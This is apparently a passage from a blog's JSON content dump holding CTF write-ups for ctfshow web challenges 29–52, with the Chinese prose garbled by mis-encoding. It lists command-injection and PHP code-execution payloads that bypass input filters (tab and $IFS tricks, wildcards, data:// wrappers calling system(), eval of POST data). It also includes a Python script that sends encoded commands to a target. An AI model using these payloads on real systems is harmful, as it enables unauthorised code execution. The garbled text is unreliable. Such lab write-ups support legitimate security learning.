æ–‡ä»¶çš„æ•°æ®åŒ… 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POSTæ–‡ä»¶ä¸Šä¼ &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt; &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ 12#!/bin/shls æ³¨ï¼šshellç¨‹åºå¿…é¡»ä»¥â€#!/bin/shâ€å¼€å§‹ï¼Œ#! /bin/sh æ˜¯æŒ‡æ­¤è„šæœ¬ä½¿ç”¨/bin/shæ¥è§£é‡Šæ‰§è¡Œï¼Œ#!æ˜¯ç‰¹æ®Šçš„è¡¨ç¤ºç¬¦ï¼Œå…¶åé¢è·Ÿçš„æ˜¯è§£é‡Šæ­¤è„šæœ¬çš„shellçš„è·¯å¾„ç”¨bpæŠ“åŒ…æŠ“åŒ…ä¹‹åæ·»åŠ å‚æ•°cå¦‚ä¸‹ï¼Œå¤šå‘åŒ…å‡ æ¬¡ï¼ˆå› ä¸ºå¹¶ä¸ä¸€å®šç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶çš„æœ€åä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™å­—æ¯ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†lså‘½ä»¤å‚æ•°å†…å®¹ä¸ºä»€ä¹ˆæ˜¯ .%20/???/????????[@-[] ,Pç¥çš„æ–‡ç« å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†ã€‚æœ€åç”¨catçœ‹ä¸€ä¸‹å°±å¯ä»¥äº†","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow åˆ·é¢˜web45~52","slug":"ctfshow-åˆ·é¢˜web45~52","date":"2023-01-17T08:34:13.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/17/ctfshow-åˆ·é¢˜web45~52/","permalink":"https://lvzhouhang.xyz/2023/01/17/ctfshow-%E5%88%B7%E9%A2%98web45~52/","excerpt":"web45è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨%09ç»•è¿‡ï¼Œ&amp;&amp;ç­‰äº;ï¼Œä¹Ÿå¯ä»¥ç”¨||å’Œ%0aã€‚payload: 123/?c=tac%09fl*||/?c=sort%09fl*||/?c=echo%09`tac%09fla*`||","text":"web45è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨%09ç»•è¿‡ï¼Œ&amp;&amp;ç­‰äº;ï¼Œä¹Ÿå¯ä»¥ç”¨||å’Œ%0aã€‚payload: 123/?c=tac%09fl*||/?c=sort%09fl*||/?c=echo%09`tac%09fla*`|| web46å¤šè¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œä½†è¿˜æ˜¯å¯ä»¥%09è¿‡æ»¤ç©ºæ ¼ï¼Œå› ä¸º%09è§£ç åå°±ä¸æ˜¯æ•°å­—äº†ï¼Œæ˜¯ä¸€ä¸ªæ°´å¹³åˆ¶è¡¨ç¬¦ã€‚*è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨?payload: 12/?c=tac%09fla?.php||/?c=nl&lt;fla&#x27;&#x27;g.php|| nlæŸ¥çœ‹æºä»£ç ï¼Œ&lt;ä»£æ›¿ç©ºæ ¼ï¼Œ&#x27;&#x27;åˆ†å‰²flagè¿‡æ»¤ï¼Œ||è§£å†³å‘½ä»¤é»‘æ´ web47æ— éå°±æ˜¯sortæ— æ³•ç”¨äº†ï¼Œä¸Šä¸€é¢˜çš„payloadè¿˜å¯ä»¥ç”¨ã€‚ web48ä¸Šä¸€é¢˜çš„payloadä¾ç„¶å¯ä»¥ç”¨ã€‚ web49ä¾ç„¶å¯ä»¥ç”¨ã€‚ web50%09è¿‡æ»¤äº†ï¼Œ&lt;&gt;å’Œ?ä¸€èµ·ä½¿ç”¨æ—¶æ²¡æœ‰å›æ˜¾,æ‰€ä»¥è¿™é‡Œçš„?å¯ä»¥ç”¨\\å’Œ&#39;&#39;è¿›è¡Œä»£æ›¿,ã€‚paylaod: 12/?c=tac&lt;fla\\g.php||/?c=nl&lt;fla&#x27;&#x27;g.php|| web51tacè¢«è¿‡æ»¤äº†ï¼Œåªèƒ½ç”¨nlã€‚payload: 1?c=nl&lt;fla\\g.php|| web52&lt;&gt;ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿˜å¯ä»¥ç”¨$IFSpayload: 1/?c=nl$&#123;IFS&#125;fla\\g.php||","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow webå…¥é—¨41~44","slug":"ctfshow41-44","date":"2023-01-14T08:14:20.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/14/ctfshow41-44/","permalink":"https://lvzhouhang.xyz/2023/01/14/ctfshow41-44/","excerpt":"web41è¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦|ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚","text":"web41è¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦|ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚ å€Ÿç”¨å¸ˆå‚…ä»¬çš„è„šæœ¬ï¼šhttps://blog.csdn.net/miuzzx/article/details/108569080 123456789101112131415161718192021222324252627282930313233343536&lt;?php$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123; for ($j=0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123; $hex_i=&#x27;0&#x27;.dechex($i); &#125; else&#123; $hex_i=dechex($i); &#125; if($j&lt;16)&#123; $hex_j=&#x27;0&#x27;.dechex($j); &#125; else&#123; $hex_j=dechex($j); &#125; $preg = &#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;; if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123; echo &quot;&quot;; &#125; else&#123; $a=&#x27;%&#x27;.$hex_i; $b=&#x27;%&#x27;.$hex_j; $c=(urldecode($a)|urldecode($b)); if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123; $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;; &#125; &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile); 1234567891011121314151617181920212223242526272829303132333435363738# -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php rce_or.php&quot;) #æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œif(len(argv)!=2): print(&quot;=&quot;*50) print(&#x27;USERï¼špython exp.py &lt;url&gt;&#x27;) print(&quot;egï¼š python exp.py http://ctf.show/&quot;) print(&quot;=&quot;*50) exit(0)url=argv[1]def action(arg): s1=&quot;&quot; s2=&quot;&quot; for i in arg: f=open(&quot;rce_or.txt&quot;,&quot;r&quot;) while True: t=f.readline() if t==&quot;&quot;: break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot; return(output) while True: param=action(input(&quot;\\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;)) data=&#123; &#x27;c&#x27;:urllib.parse.unquote(param) &#125; r=requests.post(url,data=data) print(&quot;\\n[*] result:\\n&quot;+r.text) å¾—åˆ°flag web42 123451ï¼š&gt; ä»£è¡¨é‡å®šå‘åˆ°å“ªé‡Œï¼Œä¾‹å¦‚ï¼šecho â€œ123â€ &gt; /home/123.txt2ï¼š/dev/null ä»£è¡¨ç©ºè®¾å¤‡æ–‡ä»¶3ï¼š2&gt; è¡¨ç¤ºstderræ ‡å‡†é”™è¯¯4ï¼š&amp; è¡¨ç¤ºç­‰åŒäºçš„æ„æ€ï¼Œ2&gt;&amp;1ï¼Œè¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘ç­‰åŒäº15ï¼š1 è¡¨ç¤ºstdoutæ ‡å‡†è¾“å‡ºï¼Œç³»ç»Ÿé»˜è®¤å€¼æ˜¯1ï¼Œæ‰€ä»¥&quot;&gt;/dev/null&quot;ç­‰åŒäº â€œ1&gt;/dev/nullâ€ å‚è€ƒï¼šhttps://www.cnblogs.com/kexianting/p/11630085.htmlç”¨åŒå†™ç»•è¿‡payload: 1?c=cat flag.php;ls web43å°†;è¿‡æ»¤æ‰äº†ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼›å¸¸è§çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼š 1234567891011121ã€â€œ;â€åˆ†éš”ç¬¦ç”¨åˆ†å·åˆ†éš”çš„å‘½ä»¤ä¼šæŒ‰é¡ºåºæ‰§è¡Œï¼Œå³ä½¿ä¸­é—´å‘½ä»¤ä½¿ç”¨æ–¹å¼ä¸å¯¹ï¼Œä¼šæœ‰ç›¸å…³é”™è¯¯è¾“å‡ºï¼Œåé¢çš„å‘½ä»¤ç…§æ ·ä¼šæ‰§è¡Œã€‚å¦‚ï¼šè¾“å…¥ï¼šå‘½ä»¤Aï¼›å‘½ä»¤Bï¼›å‘½ä»¤CæŒ‰é¡ºåºæ‰§è¡ŒAã€Bã€Cå‘½ä»¤ï¼Œè‹¥Bå‘½ä»¤è°ƒç”¨æ–¹å¼ä¸å¯¹ï¼Œç»ˆç«¯ä¼šæœ‰ç›¸å…³é”™è¯¯æç¤ºï¼Œæç¤ºåä¼šç»§ç»­æ‰§è¡ŒCå‘½ä»¤ã€‚2ã€â€œ&amp;&amp;â€åˆ†éš”ç¬¦åŒCã€C++è¯­è¨€é€»è¾‘è¿ç®—ç¬¦&quot;&amp;&amp;&quot;ç±»ä¼¼ï¼Œé‡åˆ°é¦–ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œåé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å¦‚ï¼šè¾“å…¥ï¼šå‘½ä»¤A &amp;&amp; å‘½ä»¤B &amp;&amp; å‘½ä»¤Cå…ˆæ‰§è¡Œå‘½ä»¤Aï¼Œè‹¥Aå‘½ä»¤æ‰§è¡Œæ­£ç¡®åˆ™å†æ‰§è¡Œå‘½ä»¤Bã€‚å‡å¦‚å‘½ä»¤Bæ‰§è¡Œå¤±è´¥ï¼Œåˆ™åœæ­¢ï¼ŒCå‘½ä»¤ä¸ä¼šè¢«æ‰§è¡Œåˆ°ã€‚3ã€â€œ||â€åˆ†éš”ç¬¦åŒCã€C++è¯­è¨€é€»è¾‘è¿ç®—ç¬¦&quot;||&quot;ç±»ä¼¼ï¼Œé‡åˆ°é¦–ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œåé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å¦‚ï¼šè¾“å…¥ï¼šå‘½ä»¤A || å‘½ä»¤B || å‘½ä»¤Cå…ˆæ‰§è¡Œå‘½ä»¤Aï¼Œè‹¥Aå‘½ä»¤æ‰§è¡Œå¤±è´¥åˆ™å†æ‰§è¡Œå‘½ä»¤Bã€‚å‡å¦‚å‘½ä»¤Bæ‰§è¡ŒæˆåŠŸï¼Œåˆ™åœæ­¢ï¼ŒCå‘½ä»¤ä¸ä¼šè¢«æ‰§è¡Œåˆ°ã€‚ payloadï¼š 1?c=tac flag.php||ls web44flagä¹Ÿè¿‡æ»¤äº†ï¼Œå°±ç”¨é€šé…ç¬¦å‘—ã€‚payload: 1/?c=tac fl*||ls å¸¸è§çš„é€šé…ç¬¦æœ‰*ã€?ã€‚","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"chtshow webå…¥é—¨37~40","slug":"chtshow37-40","date":"2023-01-11T08:21:29.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/11/chtshow37-40/","permalink":"https://lvzhouhang.xyz/2023/01/11/chtshow37-40/","excerpt":"web 37è€ƒå¯Ÿdataä¼ªåè®®ï¼Œdataä¼ªåè®®éœ€æ»¡è¶³allow_url_fopenï¼Œallow_url_includeåŒæ—¶å¼€å¯æ‰èƒ½ä½¿ç”¨ã€‚payloadï¼š 1/?c=data://text/plain,&lt;?php system(&quot;cat fl*&quot;);?&gt; web38phpè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾ç»•è¿‡phpã€‚çŸ­æ ‡ç­¾ï¼šæ¯”æ›´çµæ´»è°ƒç”¨çš„æ–¹æ³• paylaodï¼š 12?c=data://text/plain,&lt;?=`cat fla*`;?&gt;/?c=data://text/plain,&lt;?=system(&quot;cat fl*&quot;);?&gt;","text":"web 37è€ƒå¯Ÿdataä¼ªåè®®ï¼Œdataä¼ªåè®®éœ€æ»¡è¶³allow_url_fopenï¼Œallow_url_includeåŒæ—¶å¼€å¯æ‰èƒ½ä½¿ç”¨ã€‚payloadï¼š 1/?c=data://text/plain,&lt;?php system(&quot;cat fl*&quot;);?&gt; web38phpè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾ç»•è¿‡phpã€‚çŸ­æ ‡ç­¾ï¼šæ¯”æ›´çµæ´»è°ƒç”¨çš„æ–¹æ³• paylaodï¼š 12?c=data://text/plain,&lt;?=`cat fla*`;?&gt;/?c=data://text/plain,&lt;?=system(&quot;cat fl*&quot;);?&gt; web39includeä¸­å¤šäº†ä¸ª.phpï¼Œä½†æ˜¯ä¸Šä¸€é¢˜çš„payloadä¹Ÿç®¡ç”¨ï¼Œçœ‹åˆ«äººçš„wpè¯´æ˜¯æœ‰?&gt;ç»“å°¾è¿›è¡Œé—­åˆï¼Œæ‰€ä»¥æ²¡æœ‰å½±å“ã€‚payload: 1/?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt; web40è¿™ä¸ªè¿‡æ»¤äº†ä¸å°‘ä¸œè¥¿ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤è‹±æ–‡å­—æ¯ã€ä¸‹åˆ’çº¿å’Œè‹±æ–‡çš„æ‹¬å·ã€‚å¯ä»¥ç”¨æç¤ºçš„æ–¹æ³• 1234567show_source(next(array_reverse(scandir(pos(localeconv())))));show_source()å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºnext() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºarray_reverse() å‡½æ•°ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ ä¹Ÿå¯ä»¥æ¢å…¶ä»–æ–¹æ³•é¦–å…ˆ 1/?c=print_r(get_defined_vars()); è·å¾—ä¸€ä¸‹ä¿¡æ¯ä½¿ç”¨nextè·å–è¿™ä¸ªæ•°ç»„çš„ä¸‹ä¸€ä¸ªä½ç½®çš„å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯POSTçš„å…ƒç´ . 1/?c=print_r(next(get_defined_vars())); ç„¶åæŠŠè¿™ä¸ªå…ƒç´ å¼¹å‡ºï¼Œç”¨array_pop 1/?c=print_r(array_pop(next(get_defined_vars()))); æœ€åå†ç”¨evalæ‰§è¡Œä¸€ä¸‹å°±å¯ä»¥äº† 1/?c=eval(array_pop(next(get_defined_vars()))); POSTæ•°æ® 11=system(&quot;cat flag.php&quot;);æˆ–1=echo`cat flag.php`; å…³äºechoã€printã€print_rçš„åŒºåˆ«å¯ä»¥å‚è€ƒï¼šhttps://blog.51cto.com/zlong37/1556855 å¸¸ç”¨çš„æ³¨é‡Šç¬¦1#ã€--ã€-- -ã€//ã€/**/ã€/*letmetest*/ã€;%00 MySQLä¸­å¯ä»¥ä»£æ›¿ç©ºæ ¼çš„å­—ç¬¦1/**/ã€()ã€=ã€%20ã€%09ã€%0aã€0x0aã€0x0bã€0x0cã€0x0dã€+ã€-ã€~ã€.ç­‰ç­‰","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow webå…¥é—¨29~36","slug":"ctfshow29-36","date":"2023-01-09T07:00:00.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/09/ctfshow29-36/","permalink":"https://lvzhouhang.xyz/2023/01/09/ctfshow29-36/","excerpt":"web29è¿‡æ»¤äº†flagï¼Œå¯ä»¥ç”¨system,echoç­‰. 12/?c=system(&quot;cat fla*&quot;);/?c=echo`cat fl*`; web30å¤šè¿‡æ»¤äº†ä¸€ä¸ªsystemï¼Œè¿˜å¯ä»¥ç”¨echo. 1/?echo`cat fl*`;","text":"web29è¿‡æ»¤äº†flagï¼Œå¯ä»¥ç”¨system,echoç­‰. 12/?c=system(&quot;cat fla*&quot;);/?c=echo`cat fl*`; web30å¤šè¿‡æ»¤äº†ä¸€ä¸ªsystemï¼Œè¿˜å¯ä»¥ç”¨echo. 1/?echo`cat fl*`; web31catå’Œç©ºæ ¼è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨tac.ç©ºæ ¼å¯ä»¥ç”¨%09ç»•è¿‡. 1/?c=echo%09`tac%09fl*`; web32è¿‡æ»¤çš„ä¸œè¥¿å¤ªå¤šäº†å·¦æ‹¬å·éƒ½ç»™è¿‡æ»¤äº†ï¼Œä½¿ç”¨å‘½ä»¤é€ƒé€¸+æ–‡ä»¶åŒ…å«.ç©ºæ ¼å¯ä»¥ç”¨%09ç»•è¿‡ï¼Œ ï¼›å¯ä»¥ç”¨?&gt;ç»•è¿‡,å› ä¸ºä½¿ç”¨?&gt;ï¼Œæ‰€ä»¥åé¢æ²¡åŠæ³•ç›´æ¥æ‹¼æ¥phpè¯­å¥ï¼Œéœ€è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«. 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php å†å°†å¾—åˆ°çš„è¿›è¡Œbase64è§£ç å¾—åˆ°flag web33å’Œweb32å·®ä¸å¤šï¼Œç”¨åŒæ ·çš„payloadå°±è¡Œ 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php web34ä¾æ—§å¯ä»¥ç”¨åŒæ ·çš„payload 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php web35ä¾æ—§å¯ä»¥ç”¨åŒæ ·çš„payload 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php è¿ç»­å‡ é“é¢˜éƒ½ä¸€æ ·ï¼Œå†™çš„çœŸæ¶å¿ƒ. web36è¿™é“é¢˜æŠŠ1æ¢æˆå…¶ä»–çš„å­—ç¬¦å°±è¡Œï¼Œå…¶ä»–æ­¥éª¤ä¸€æ ·. 1/?c=include%09$_GET[a]?&gt;&amp;&amp;a=php://filter/convert.base64-encode/resource=flag.php requireå¯ä»¥ä»£æ›¿includeï¼ŒPHPå¸¸ç”¨çš„å¯ä»¥ä¸åŠ æ‹¬å·çš„å‡½æ•°echoã€printã€issetã€unsetã€includeã€require.","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]}],"categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"},{"name":"HTB","slug":"HTB","permalink":"https://lvzhouhang.xyz/categories/HTB/"},{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"},{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"},{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://lvzhouhang.xyz/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://lvzhouhang.xyz/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/categories/JAVA/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"java","slug":"web/java","permalink":"https://lvzhouhang.xyz/categories/web/java/"},{"name":"boot2root","slug":"boot2root","permalink":"https://lvzhouhang.xyz/categories/boot2root/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"ctfshow/åˆ·é¢˜/phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"ctfshow/åˆ·é¢˜/æ–‡ä»¶åŒ…å«","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/categories/BugKu/"},{"name":"åˆ·é¢˜","slug":"BugKu/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/BugKu/%E5%88%B7%E9%A2%98/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"åˆ·é¢˜","slug":"web/ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/categories/MISC/"},{"name":"NSSCTF","slug":"MISC/NSSCTF","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/"},{"name":"åˆ·é¢˜","slug":"MISC/NSSCTF/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"å†…ç½‘","slug":"å†…ç½‘","permalink":"https://lvzhouhang.xyz/tags/%E5%86%85%E7%BD%91/"},{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://lvzhouhang.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/tags/JAVA/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"},{"name":"vulnhub","slug":"vulnhub","permalink":"https://lvzhouhang.xyz/tags/vulnhub/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://lvzhouhang.xyz/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%